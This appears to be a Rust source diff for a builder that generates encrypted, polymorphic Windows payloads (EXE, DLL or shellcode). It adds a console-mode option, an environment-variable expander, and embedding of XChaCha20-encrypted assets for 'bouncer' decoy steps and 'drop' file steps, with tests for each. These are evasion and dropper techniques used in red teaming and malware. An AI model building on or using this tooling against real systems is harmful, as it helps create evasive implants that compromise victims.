@@ -18,7 +18,7 @@ use super::obfuscation::StringsConfig;
 use super::syscalls::{self, SyscallsConfig, SyscallsMode};
 use super::{args, debug, imports, stub, BuildError, Result};
 use crate::plan::schema::{
-    DllEntry, OutputKind, PayloadFormat, StepControl, StepFailure, StepOutcome,
+    ConsoleMode, DllEntry, OutputKind, PayloadFormat, StepControl, StepFailure, StepOutcome,
 };
 use crate::techniques::{Category, RuntimeStep, TechniqueKind};
 
@@ -69,6 +69,40 @@ fn decrypt_step(enc: &[u8], nonce_hex: &str, key_hex: &str, len: usize) -> Resul
         return Err("decrypted payload size does not match the expected size".to_string());
     }
     Ok(image)
+}
+
+/// Expands `%NAME%` environment references in a template (a path, ...).
+///
+/// An unknown name is left as written, so the template degrades to a literal
+/// path instead of dropping the variable.
+#[allow(dead_code)]
+fn expand_env(template: &str) -> String {
+    let mut out = String::new();
+    let mut rest = template;
+    while let Some(start) = rest.find('%') {
+        out.push_str(&rest[..start]);
+        let after = &rest[start + 1..];
+        match after.find('%') {
+            Some(end) => {
+                let name = &after[..end];
+                match std::env::var(name) {
+                    Ok(value) => out.push_str(&value),
+                    Err(_) => {
+                        out.push('%');
+                        out.push_str(name);
+                        out.push('%');
+                    }
+                }
+                rest = &after[end + 1..];
+            }
+            None => {
+                out.push('%');
+                rest = after;
+            }
+        }
+    }
+    out.push_str(rest);
+    out
 }
 "#;
 
@@ -145,6 +179,8 @@ pub struct StepsParams {
     pub kind: OutputKind,
     /// What starts the chain in a DLL build (`build.output.entry`).
     pub entry: DllEntry,
+    /// Console behavior for a DLL/shellcode build (`build.output.console`).
+    pub console: ConsoleMode,
     /// Per-build source-entropy seed (`build.polymorphism`), or `None` when the
     /// source phase is off (`mode: none`/`codegen`). Baked into `.text` as an
     /// immediate so two builds of one plan differ even under the same codegen
@@ -288,7 +324,7 @@ fn render_common(
     // simply omits the placeholder.
     values.insert(
         "$ENTRY_BLOCK$".to_string(),
-        super::entry::render(params.kind, &params.entry),
+        super::entry::render(params.kind, &params.entry, params.console),
     );
     values.insert("$STEP_MODULES$".to_string(), modules);
     values.insert("$STEP_RUNNER_BODY$".to_string(), runner);
@@ -419,9 +455,17 @@ fn render_step_module(step: &StepPayload, strings: &StringsConfig) -> Result<Str
         .and_then(|payload| payload.export.as_deref());
     let fragment = step.technique.render_fragment(strings, format, export);
 
+    // The `bouncer` decoy and the `drop` file are embedded, encrypted assets a
+    // Preparation step carries. Their module-level constants and `asset_bytes()`
+    // helper are injected ahead of the fragment (which calls them at run time).
+    let asset_prelude = match &step.technique {
+        TechniqueKind::Bouncer { .. } | TechniqueKind::Drop { .. } => render_step_asset(step),
+        _ => String::new(),
+    };
+
     let body = match step.technique.category() {
         Category::Preparation => format!(
-            "{fragment}\n    pub fn run() -> Result<bool, String> {{\n        {}().map_err(|e| e.to_string())\n    }}\n",
+            "{asset_prelude}{fragment}\n    pub fn run() -> Result<bool, String> {{\n        {}().map_err(|e| e.to_string())\n    }}\n",
             step.technique.name()
         ),
         Category::Execution => {
@@ -443,6 +487,37 @@ fn render_step_module(step: &StepPayload, strings: &StringsConfig) -> Result<Str
         ),
     };
     Ok(format!("mod step_{} {{\n{body}}}\n", step.index))
+}
+
+/// Renders an embedded asset into a step module (the `bouncer` decoy and the
+/// `drop` file).
+///
+/// When the step carries an asset payload, its module gets the ciphertext
+/// `include_bytes!` and an `asset_bytes()` helper that decrypts it on demand.
+/// Without an asset the helper is a dead stub, so a fragment type-checks for
+/// every such step.
+fn render_step_asset(step: &StepPayload) -> String {
+    match &step.payload {
+        Some(payload) => format!(
+            "    // Embedded asset: XChaCha20-encrypted, decrypted on demand.\n\
+             \x20   const ASSET_ENC: &[u8] = include_bytes!(\"{path}\");\n\
+             \x20   const ASSET_NONCE: &str = \"{nonce}\";\n\
+             \x20   const ASSET_KEY: &str = \"{key}\";\n\
+             \x20   const ASSET_LEN: usize = {len};\n\
+             \x20   fn asset_bytes() -> Result<Vec<u8>, String> {{\n\
+             \x20       crate::decrypt_step(ASSET_ENC, ASSET_NONCE, ASSET_KEY, ASSET_LEN)\n\
+             \x20   }}\n",
+            path = payload.path,
+            nonce = hex::encode(payload.nonce),
+            key = hex::encode(payload.key),
+            len = payload.plaintext_len,
+        ),
+        None => "    #[allow(dead_code)]\n\
+                 \x20   fn asset_bytes() -> Result<Vec<u8>, String> {\n\
+                 \x20       Err(String::new())\n\
+                 \x20   }\n"
+            .to_string(),
+    }
 }
 
 /// Renders the runner body: one straight-line block per step, in order.
@@ -710,6 +785,7 @@ pub(crate) fn test_params(
         windows_subsystem: false,
         kind: OutputKind::Exe,
         entry: DllEntry::Auto,
+        console: ConsoleMode::Parent,
         poly_seed: None,
     }
 }
@@ -812,6 +888,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            console: ConsoleMode::Parent,
             poly_seed: None,
         };
         render_builtin(
@@ -832,6 +909,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            console: ConsoleMode::Parent,
             poly_seed: None,
         };
         render_builtin(
@@ -894,6 +972,72 @@ mod tests {
         assert!(
             out.contains("Ok(false) => return Ok(0)"),
             "the abort arm is missing"
+        );
+    }
+
+    #[test]
+    fn a_bouncer_decoy_step_embeds_and_decrypts_its_asset() {
+        let step = StepPayload {
+            index: 0,
+            label: "bouncer".to_string(),
+            technique: serde_yml::from_str(
+                "technique: bouncer\nparams:\n  on_fail: decoy\n  hostname: h\n  decoy: { path: x, payload: p }\n",
+            )
+            .expect("technique"),
+            control: StepControl::default(),
+            payload: Some(cipher("decoy_0.bin", "M")),
+        };
+        let out = render(vec![step]);
+        assert!(out.contains("fn asset_bytes()"), "asset helper missing");
+        assert!(
+            out.contains("include_bytes!(\"decoy_0.bin\")"),
+            "the decoy asset is not embedded"
+        );
+        assert!(
+            out.contains("crate::decrypt_step(ASSET_ENC"),
+            "the decoy is not decrypted through the shared helper"
+        );
+        assert!(
+            out.contains("pub fn run() -> Result<bool, String>"),
+            "the preparation adapter is missing"
+        );
+    }
+
+    #[test]
+    fn a_bouncer_without_a_decoy_still_compiles_the_helper() {
+        let mut step = preparation_step(0);
+        step.technique = serde_yml::from_str("technique: bouncer\nparams: { hostname: h }\n")
+            .expect("technique");
+        let out = render(vec![step]);
+        assert!(out.contains("fn asset_bytes()"), "stub helper missing");
+        assert!(out.contains("Err(String::new())"), "stub body missing");
+        assert!(
+            !out.contains("include_bytes!"),
+            "a bouncer without a decoy must not embed an asset"
+        );
+    }
+
+    #[test]
+    fn a_drop_step_embeds_and_decrypts_its_asset() {
+        let step = StepPayload {
+            index: 0,
+            label: "drop".to_string(),
+            technique: serde_yml::from_str(
+                "technique: drop\nparams: { path: \"TEST.docx\", payload: doc }\n",
+            )
+            .expect("technique"),
+            control: StepControl::default(),
+            payload: Some(cipher("asset_0.bin", "M")),
+        };
+        let out = render(vec![step]);
+        assert!(out.contains("fn asset_bytes()"), "asset helper missing");
+        assert!(
+            out.contains("include_bytes!(\"asset_0.bin\")"),
+            "the dropped asset is not embedded"
+        );
+        assert!(
+            out.contains("pub fn run() -> Result<bool, String>"),
+            "the preparation adapter is missing"
         );
     }
 
@@ -992,6 +1136,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Dll,
             entry: DllEntry::Export("Start".to_string()),
+            console: ConsoleMode::Parent,
             poly_seed: None,
         };
         let source = render_builtin(
@@ -1029,6 +1174,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            console: ConsoleMode::Parent,
             poly_seed: None,
         };
         let rendered = render_custom(
@@ -1052,6 +1198,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            console: ConsoleMode::Parent,
             poly_seed: None,
         };
         let result = render_builtin(
@@ -1073,6 +1220,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            console: ConsoleMode::Parent,
             poly_seed: None,
         };
         let rendered = render_custom(
@@ -1144,6 +1292,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Exe,
             entry: DllEntry::Auto,
+            console: ConsoleMode::Parent,
             poly_seed: None,
         };
         let source = render_builtin(
@@ -1187,6 +1336,7 @@ mod tests {
             windows_subsystem: false,
             kind: OutputKind::Dll,
             entry: DllEntry::Auto,
+            console: ConsoleMode::Parent,
             poly_seed: None,
         };
         let source = render_builtin(
@@ -1272,6 +1422,7 @@ mod tests {
                 windows_subsystem: false,
                 kind: OutputKind::Exe,
                 entry: DllEntry::Auto,
+                console: ConsoleMode::Parent,
                 poly_seed: Some(seed),
             };
             let source = render_builtin(
